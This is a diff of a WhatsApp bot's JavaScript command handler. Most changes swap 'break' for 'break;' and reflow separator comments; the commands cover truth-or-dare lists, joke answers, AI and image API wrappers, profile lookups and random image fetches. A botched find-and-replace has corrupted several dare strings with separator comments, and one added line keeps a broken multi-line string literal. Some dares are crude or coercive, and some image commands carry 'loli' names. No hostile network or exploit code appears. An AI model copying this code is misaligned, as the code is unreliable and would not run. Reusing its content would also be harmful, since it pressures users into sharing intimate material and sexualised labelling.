-            text: `Hi ${m.pushName}\nVeuillez choisir le bouton ci-dessous`
+            text: `Hi ${m.pushName}\nPlease Choose The Button Below`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -7517,9 +7360,8 @@ case 'truth': case 'dare': {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'dere':{
               const dare =[
     "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
@@ -7562,9 +7404,8 @@ case 'dere':{
     "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
     "Walk on your elbows and knees for as long as you can",
     "sing national anthem in voice note",
-    "break
-//===========================================================================================================================//
-dance for 30 seconds in the sitting roomðŸ˜‚",
+    "break;
+//===========================================================================================================================//dance for 30 seconds in the sitting roomðŸ˜‚",
     "Tell the saddest story you know",
     "make a twerk dance video and put it on status for 5mins",
     "Eat a raw piece of garlic",
@@ -7597,9 +7438,7 @@ dance for 30 seconds in the sitting roomðŸ˜‚",
     "say i love the bot owner xenon through voice note",
     "send your gf/bf pic here",
     "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
-    "break
-//===========================================================================================================================//
-up with your best friend for 5hrs without telling him/her that its a dare",
+    "breakup with your best friend for 5hrs without telling him/her that its a dare",
      "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
      "say i love depak kalal through voice note",
      "write i am feeling horny and put it on status, u can delete it only after 5hrs",
@@ -7650,12 +7489,10 @@ up with your best friend for 5hrs without telling him/her that its a dare",
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-              break
+              break;
 //===========================================================================================================================//
-
-                            break
+                            break;
 //===========================================================================================================================//
-
        case 'turut':{
               const truth =[
     "Have you ever liked anyone? How long?",
@@ -7728,7 +7565,7 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     "Mention the incident that makes you hurt that you still remember",
     "what achievements have you got this year?",
     "what was your worst habit at school?",
-    "do you love the bot creator, xenon?ðŸ¤£",
+    "do you love the bot creator, Xenon?",
     "have you ever thought of taking revenge from ur teacher?",
     "do you like current prime minister of ur country",
     "you non veg or veg",
@@ -7790,9 +7627,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-              break
+              break;
 //===========================================================================================================================//
-
 			case 'pickupline': {
 try {
     let res = await fetch(`https://api.popcat.xyz/pickuplines`)
@@ -7845,9 +7681,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     // Handle the error appropriately
   }
   }
-  break
+  break;
 //===========================================================================================================================//
-
 			case 'pick': {
             	if (!m.isGroup) return XenonStickGroup()
             	if (!text) return replygcxenon(`What do you want to pick?\nExample: ${prefix + command} idiot`)
@@ -7898,9 +7733,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
              
          }
-     break
+     break;
 //===========================================================================================================================//
-
 			case 'fact': {
     	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
         let msgs = generateWAMessageFromContent(m.chat, {
@@ -7943,9 +7777,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     }
-    break
+    break;
 //===========================================================================================================================//
-
 			case 'stupidcheck':case 'uncleancheck':
 case 'hotcheck': case 'smartcheck':
 case 'greatcheck':
@@ -7994,9 +7827,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
   }
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
-break
+break;
 //===========================================================================================================================//
-
             case 'soulmate': {
             if (!m.isGroup) return XenonStickGroup()
             let member = participants.map(u => u.id)
@@ -8044,9 +7876,8 @@ break
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})        
             }
-            break
+            break;
 //===========================================================================================================================//
-
  case 'couple': {
             if (!m.isGroup) return XenonStickGroup()
             let member = participants.map(u => u.id)
@@ -8092,9 +7923,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'can': {
             	if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} i dance?`)
             	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
@@ -8140,9 +7970,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'is': {
             	if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} she virgin?`)
             	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
@@ -8188,9 +8017,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'when': {
             	if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} will i get married?`)
             	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
@@ -8236,9 +8064,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'what': {
             	if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} is your name?`)
             	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
@@ -8284,9 +8111,8 @@ case 'what': {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'where': {
 if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} is your name?`)
             	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
@@ -8332,9 +8158,8 @@ if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} is
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'how': {
             	if (!text) return replygcxenon(`Ask question\n\nExample : ${prefix + command} to date girl?`)
             	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
@@ -8380,9 +8205,8 @@ case 'how': {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'rate': {
             	if (!text) return replygcxenon(`Example : ${prefix + command} my profile`)
             	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -8428,9 +8252,8 @@ case 'rate': {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'define': 
 if (!q) return replygcxenon(`What do you want to define?`)
 try {
@@ -8487,9 +8310,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     console.log(err)
     return replygcxenon(`*${q}* isn't a valid text`)
     }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'blackboxai': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} write a program to delete file`);   
         try {
@@ -8537,9 +8359,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'travel-assistant': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} how can i visit taj mahal`);   
         try {
@@ -8587,9 +8408,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'dalle': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -8637,9 +8457,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'guru-ai': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} how to make girl pregnant`);   
         try {
@@ -8687,9 +8506,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'emi-ai': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -8737,9 +8555,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'claude-ai': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} how to make girl pregnant`);   
         try {
@@ -8787,9 +8604,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
-//===========================================================================================================================//
- 
+    break;
+//===========================================================================================================================// 
     case 'hercai-cartoon': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -8837,9 +8653,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'hercai-animefy': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -8887,9 +8702,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'hercai-lexica': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -8937,9 +8751,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'hercai-prodia': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -8987,9 +8800,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'hercai-simurg': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -9037,9 +8849,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'hercai-raava': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -9087,9 +8898,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'hercai-shonin': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} a girl singing in public`);   
         try {
@@ -9137,9 +8947,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'realistic': case '3dmodel': {
     	if (!text) return replygcxenon(`*Example:* ${prefix + command} blue sky`)
     let lastUsed = 0;
@@ -9192,9 +9001,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     return replygcxenon("`GPT Not Responding`")
   }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'photoleap': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} blue sea`);
   let currentTime = Date.now();
@@ -9246,9 +9054,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     return replygcxenon("`*Error*`");
   }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'ai': case 'gpt': case 'openai': {
 	if (!text) return replygcxenon(`*• Example:* ${prefix + command} what is your name`);   
         try {
@@ -9296,9 +9103,8 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  return replygcxenon("`*Error*`")
 }
 }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
 let me = m.sender
 let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
@@ -9322,16 +9128,14 @@ mentionedJid:[sender],
 }
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'runtime': {
             	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                 replygcxenon(lowq)
             	}
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'xruntime': case 'testx': case 'xbot': {
 				if (text && text.startsWith('--') && XenonTheCreator) {
 					let buttonnya = [{
@@ -9376,11 +9180,10 @@ case 'runtime': {
 					XenonBotInc.sendMessage(m.chat, { text: `*Bots Have Been Online For*\n*${runtime(process.uptime())}*` }, { quoted: m })
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 case 'ghstalk': case 'githubstalk':{
-if (!q) return replygcxenon(`Example ${prefix+command} Dr.Xenon`)
+if (!q) return replygcxenon(`Example ${prefix+command} DrXenon`)
 await XenonStickWait()
 let githubstalk = require('./lib/scraper')
 aj = await githubstalk.githubstalk(`${q}`)
@@ -9407,9 +9210,8 @@ Following : ${aj.following}
 Created At : ${aj.ceated_at}
 Updated At : ${aj.updated_at}` }, { quoted: m } )
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'npmstalk':{
 if (!q) return replygcxenon(`Example ${prefix+command} xenonapi`)
 await XenonStickWait()
@@ -9426,9 +9228,8 @@ Publish Dependencies : ${eha.publishDependencies}
 Publish Time : ${eha.publishTime}
 Latest Publish Time : ${eha.latestPublishTime}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'ffstalk':{
 if (!q) return replygcxenon(`Example ${prefix+command} 946716486`)
 await XenonStickWait()
@@ -9439,9 +9240,8 @@ replygcxenon(`*/ Free Fire Stalker \\*
 Id : ${eeh.id}
 Nickname : ${eeh.nickname}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'mlstalk': {
 if (!q) return replygcxenon(`Example ${prefix+command} 530793138|8129`)
 await XenonStickWait()
@@ -9453,9 +9253,8 @@ Username : ${dat.userName}
 Id : ${q.split("|")[0]}
 ID Zone: ${q.split("|")[1]}`)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'tiktokstalk': {
 	  if (!text) return replygcxenon(`Username? `)
   let res = await fg.ttStalk(args[0])
@@ -9472,9 +9271,8 @@ break
 └────────────`
   await XenonBotInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'tiktokgirl':{
 await XenonStickWait()
 var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
@@ -9519,9 +9317,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktokghea':{
 await XenonStickWait()
 var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
@@ -9567,9 +9364,8 @@ contextInfo: {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktokbocil':{
 await XenonStickWait()
 var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
@@ -9615,9 +9411,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktoknukhty':{
 await XenonStickWait()
 var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
@@ -9663,9 +9458,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktoksantuy':{
 await XenonStickWait()
 var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
@@ -9711,9 +9505,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktokkayes':{
 await XenonStickWait()
 var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
@@ -9759,9 +9552,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktokpanrika':{
 await XenonStickWait()
 var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
@@ -9807,9 +9599,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'tiktoknotnot':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
@@ -9855,9 +9646,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'chinese':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
@@ -9902,9 +9692,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'hijab':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
@@ -9950,9 +9739,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'japanese':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
@@ -9998,9 +9786,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'korean':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
@@ -10046,9 +9833,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'malay':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
@@ -10094,9 +9880,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'randomgirl':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
@@ -10142,9 +9927,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'randomboy':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
@@ -10190,9 +9974,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'thai':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
@@ -10238,9 +10021,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'vietnamese':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
@@ -10286,9 +10068,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'indo':{
 await XenonStickWait()
 var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
@@ -10334,9 +10115,8 @@ _*Here is the result of: ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'woof':
 case '8ball':
 case 'goose':
@@ -10351,111 +10131,110 @@ case 'meow':{
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
 await XenonStickWait()
 let heyy
-if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/akira.json')
-if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/akiyama.json')
-if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/ana.json')
-if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/art.json')
-if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/asuna.json')
-if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/ayuzawa.json')
-if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/boneka.json')
-if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/boruto.json')
-if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/bts.json')
-if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/cecan.json')
-if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/chiho.json')
-if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/chitoge.json')
-if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/cogan.json')
-if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/cosplay.json')
-if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/cosplayloli.json')
-if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/cosplaysagiri.json')
-if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/cyber.json')
-if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/deidara.json')
-if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/doraemon.json')
-if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/eba.json')
-if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/elaina.json')
-if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/emilia.json')
-if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/erza.json')
-if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/exo.json')
-if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/femdom.json')
-if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/freefire.json')
-if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/gamewallpaper.json')
-if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/glasses.json')
-if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/gremory.json')
-if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/hekel.json')
-if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/hestia.json')
-if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/husbu.json')
-if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/inori.json')
-if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/islamic.json')
-if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/isuzu.json')
-if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/itachi.json')
-if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/itori.json')
-if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/jeni.json')
-if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/jiso.json')
-if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/justina.json')
-if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kaga.json')
-if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kagura.json')
-if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kakasih.json')
-if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kaori.json')
-if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/kartun.json')
-if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/katakata.json')
-if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/master/keneki.json')
